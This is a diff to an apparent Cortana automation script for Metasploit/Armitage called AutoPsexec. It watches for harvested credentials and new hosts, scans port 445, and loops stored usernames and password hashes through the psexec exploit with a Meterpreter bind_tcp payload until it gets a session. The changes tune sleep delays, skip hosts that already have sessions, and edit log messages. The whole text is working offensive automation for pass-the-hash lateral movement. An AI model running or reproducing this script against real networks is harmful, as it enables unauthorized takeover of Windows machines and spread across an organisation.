@@ -4,6 +4,7 @@
 # by monstream00
 
 on credential_add {
+	#sleep(2 * 1000);
 	if ("IUSR*" !iswm $3) {
 		if ("Guest" !iswm $3) {
 			if ("Help*" !iswm $3) {		
@@ -23,7 +24,10 @@ on credential_add {
 							add(@CredsHashs, @CurrentHash, $counterx);
 							$counterx += 1;
 							$console = console();
-							cmd($console, "hosts -c address,mac");
+							if (host_session($1) is $null) {
+								cmd($console, "hosts -c address,mac");
+							}
+							#cmd($console, "hosts -c address,mac");
 							#println("=====================================================");
 							#println("Credential_Array Start");
 							#println("=====================================================");
@@ -43,18 +47,22 @@ on credential_add {
 
 on service_add_445 {
 	$console = console();
-	cmd($console, "hosts -c address,mac");
+	if (host_session($1) is $null) {
+		cmd($console, "hosts -c address,mac");
+	}
 }
 
 on session_close {
 	println("[*] Session $1 closed. Trying to recover " . session_host($1) . " with PSEXEC!");
 	$console = console();
-	cmd($console, "hosts -c address,mac");
+	if (host_session($1) is $null) {
+		cmd($console, "hosts -c address,mac");
+	}
 }
 
 on host_add {
 	$console = console();
-	$console = open_console_tab("AutoPsexec_hostadd_$1"); #Debug use
+	#$console = open_console_tab("AutoPsexec_hostadd_$1"); #Debug use
 	#speed up PSEXEC pass the hash cortana script
 	println("[*] msfScanning 445 TCP check on $1");
 	cmd($console, "use auxiliary/scanner/portscan/tcp");
@@ -62,13 +70,15 @@ on host_add {
 	cmd($console, "set PORTS 445");
 	cmd($console, "set RHOSTS $1");
 	cmd($console, "run -j");
-	sleep(15 * 1000);
-	cmd($console, "hosts -c address,mac");
+	sleep(10 * 1000);
+	if (host_session($1) is $null) {
+		cmd($console, "hosts -c address,mac");
+	}
 	db_sync(); 
 }
 
 on console_hosts {
-	sleep(20 * 1000);
+	#sleep(5 * 1000);
 	# which host are we dealing also check if 445 is open with services -S IP_Addres -p 445
 	@validIPs_hosts = parse_table($3, @("address", "mac"));
 	foreach $validIPs_hosts (@validIPs_hosts) {
@@ -77,7 +87,7 @@ on console_hosts {
 		$host = host_session($validIP_hosts);
 		#If $host null then no sessions!!!!
 		if ($host eq $null) {
-			sleep(20 * 1000);
+			#sleep(5 * 1000);
 			if (@CredsHashs !is $null) {
 				cmd($console, "services -S $validIP_hosts -p 445");
 			}
@@ -86,7 +96,7 @@ on console_hosts {
 }
 
 on console_services {
-	sleep(20 * 1000);
+	#sleep(5 * 1000);
 	# which host are we dealing also check if 445 is open with services -S IP_Addres -p 445
 	#println("=====================================================");
 	#println("Console_Services Start");
@@ -98,7 +108,7 @@ on console_services {
 		$host = host_session($validIP_services);
 		#If $host null then no sessions!!!!
 		if ($host eq $null) {
-			sleep(20 * 1000);
+			#sleep(20 * 1000);
 			if (@CredsHashs !is $null) {
 				$countery = 0;
 				foreach $credhash (@CredsHashs) {
@@ -106,17 +116,17 @@ on console_services {
 					$passwordd = @CredsHashs[$countery][1];
 					#println("[*] host_sessions: " . host_session($validIP_services));
 					if (host_session($validIP_services) is $null) {	
-						println("[*] SERVICES - Testing Host: $validIP_services with: $usernamee , $passwordd");
+						println("[*] Testing Host: $validIP_services with: $usernamee , $passwordd");
 						$console = console();				
 						cmd($console, "use exploit/windows/smb/psexec");
 						cmd_set($console, %(RHOST => "$validIP_services", PAYLOAD => "windows/meterpreter/bind_tcp", SMBUser => "$usernamee", SMBPass => "$passwordd"));
 						cmd($console, "exploit -j");
-						#println("[*] Going to sleep for 20 seconds.");
+						#println("[*] Going to sleep for 15 seconds.");
 						sleep(20 * 1000);
 						#println("[*] Wakeing Up.");
 					}
 					if (host_session($validIP_services) !is $null) {
-						println("[*] SERVICES - Got session stopping autoPSEXEC on host $validIP_services");
+						println("[*] Got session stopping autoPSEXEC on host $validIP_services");
 						break;
 					}			
 					$countery += 1;
